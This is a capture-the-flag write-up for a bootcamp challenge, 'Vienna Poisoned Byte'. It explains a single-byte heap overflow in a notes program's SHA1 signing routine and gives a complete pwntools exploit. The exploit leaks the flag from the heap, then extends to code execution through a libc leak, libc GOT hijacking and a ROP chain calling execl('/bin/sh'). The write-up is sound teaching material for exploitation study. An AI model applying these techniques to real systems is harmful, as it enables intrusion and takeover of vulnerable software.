---
layout: posts
title:  "Vienna Poisoned Byte"
date:   2024-06-09 12:00:00 +0200
---
*Challenge from a bootcamp I was invited to focused on heap exploitation with single byte overwrite*

We are given a binary and libc files.

From analyzing binary in ghidra we can see it contains single write overwrite, while signing notes

```c
void sign_notes(void)

{
  long in_FS_OFFSET;
  long local_98;
  undefined8 *local_90;
  SHA_CTX local_88;
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  SHA1_Init(&local_88);
  local_90 = notes;
  local_98 = random();
  SHA1_Update(&local_88,&local_98,8);
  for (; local_90 != (undefined8 *)0x0; local_90 = (undefined8 *)*local_90) {
    SHA1_Update(&local_88,local_90 + 2,local_90[1]);
    SHA1_Final((uchar *)(local_90[1] + 0x10 + (long)local_90),&local_88);
    printf("Note signed: ");
    print_signature(local_90);
    puts("");
  }
  puts("Notes signed!");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

This happens in SHA1_Final call, where the sha1 hash will be written to `local_90[1] + 0x10 + local_90` which is input size + 10 bytes + address of chunk.

The size that is put into malloc when creating chunk is equal to input_size + 0x23. First 8 bytes of chunk are used as pointer to another note and the second qword is used as size field for printing the chunk. This leaves us with `0x23-0x10=0x13=19 bytes`

SHA_1 hash is 20 bytes long, therefore by setting such data size, that malloc gets called with size of 0xn8, will result in single byte overwrite into size field of next chunk.

Reminder: `malloc(0x38)` and `malloc(0x30)` will return the same chunk size `0x40`, because `prev_size` field of next chunk is used to store data.

Now we modify the chunk size of chunk to inglobate another chunk, utilizing the single byte overwrite.

For that chunk we need to use a size such that it goes in unsorted bin, so when we reallocate the size of the first chunk, we break the second chunk with fwd and bck pointer.

```python
new(0x15, b"A"*5)
new(0x508-0x4, b"B"*5)
new(0x18-0x4, b'C'*5)
new(0x18-0x4, b"DDDD")

wait_for_shas(3, b'71')

delete(2)
new(0x508-0x4, b"DDDD"*50)

```

This corrupts the size, so when you print the chunk we corrupted, it dumps the whole heap.

Note:
Even though the flag is being loaded onto the stack, it goes into the heap because of buffering.

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./poisoned_byte_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

def main():
    r = conn()

    # good luck pwning :)

    def new(n, data):
        r.read()
        r.writeline(b'1')
        r.read()
        r.writeline(f'{n}'.encode())
        r.read()
        r.writeline(data)

    def sign():
        r.read()
        r.writeline(b'2')

    def edit(idx,data):
        r.read()
        r.writeline(b'3')
        r.read()
        r.writeline(f'{idx}'.encode())
        r.read()
        r.writeline(data)

    def delete(idx):
        r.read()
        r.writeline(b'4')
        r.read()
        r.writeline(f'{idx}'.encode())

    def print_notes(idx):
        r.read()
        r.writeline(b'5')
        r.read()
        r.writeline(f'{idx}'.encode())

    def load():
        r.read()
        r.writeline(b'6')

    def exit():
        r.read()
        r.writeline(b'7')

    def wait_for_shas(n,idx):
        run = True
        sig = []
        while run:
            sign()

            out = r.readline()

            i = 0
            while not b'Notes signed!' in out:

                if b'Note signed:' in out:
                    #print(out[-3:-1])
                    #print(i, out)
                    print(i,out[-3:-1], idx, n)
                    if out[-3:-1] == idx and n == i:
                        print('AAAA')
                        run = False
                        sig.append(out)
                    i += 1
                out = r.readline()
            if not run:
                break
        print('win', sig)
        return out

    new(0x15, b"A"*5)
    new(0x508-0x4, b"B"*5)
    new(0x18-0x4, b'C'*5)
    new(0x18-0x4, b"DDDD")

    wait_for_shas(3, b'71')

    delete(2)
    new(0x508-0x4, b"DDDD"*50)

    load()
    print_notes(2)
    print(r.readn(2000))
    r.readall()
    r.interactive()

if __name__ == "__main__":
    main()

```

# RCE

Even though we got the flag we can utilize this bug fully to get RCE.

From the challenge we know how to leak from heap, therefore we can use freed chunk into unsorted bin to leak libc address. This is basically the same as in original challenge, however we need to allocate few more chunks:

```python
    new(0x15, b"A"*5)
    new(0x508-0x4, b"B"*5)
    new(0x18-0x4, b'HOOK')
    new(0x28-0x4, b"VICTIM")
    new(0x518-0x4, b'LEAK')
    new(0x18-0x4, b"GUARD")

    wait_for_shas(5, b'71')

    delete(4)

    new(0x508-0x4-0x10, b"DDDD"*50)

    new(0x28-0x4, p64(0)+p64(0x100)+p64(0x1337)+p64(0x1000))
    delete(3)
    print_notes(4)

    r.readuntil(b"), ")
    leaks = b""
    while len(leaks) < 0x100:
        leaks += r.recv(0x100 - len(leaks))
    leaks = unpack_many(leaks)
    libc.address = leaks[0x10] - 0x21ace0
    print(hex(libc.address))
```

Given we have libc leak, we could leak stack, find offset to function return and then put rop chain there.

Instead of that we can utilize Libc GOT Hijacking(glibc >2.35 & glibc <=2.38)
<br>aka. Glibc is FULL RELRO by default for glibc2.39

The exploit is based on setcontext32. There is useful link to make these payloads shorter:

[https://github.com/n132/Libc-GOT-Hijacking/blob/main/README.md](https://github.com/n132/Libc-GOT-Hijacking/blob/main/README.md)

We can craft the payload that calls `system(’/bin/sh’)`

```python
got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
print(hex(got))
plt0 = libc.address + libc.get_section_by_name(".plt").header.sh_addr
print(hex(plt0))

edit(4, b"A" * (3 * 0x10) + p64(got - 0x8))

rop = ROP(libc)
pivot = rop.find_gadget(["pop rsp", "ret"]).address

rop.execl(next(libc.search(b"/bin/sh\\x00")), 0x0)
payload = flat(
    p64(got+8+0x38*8), # the rop chain address
    p64(pivot),
    p64(plt0) * 0x36,
    flat(rop.chain()),
    p64(got+0x3000)
)
time.sleep(1)

edit(4, payload)
r.interactive()
```

The jump to payload is automatic on basically every libc function. To actually write to GOT we overwrite the ptr to the next chunk and then access this chunk from linked list.

VBC{OneByte_isenoug_to_pwn_thing!}
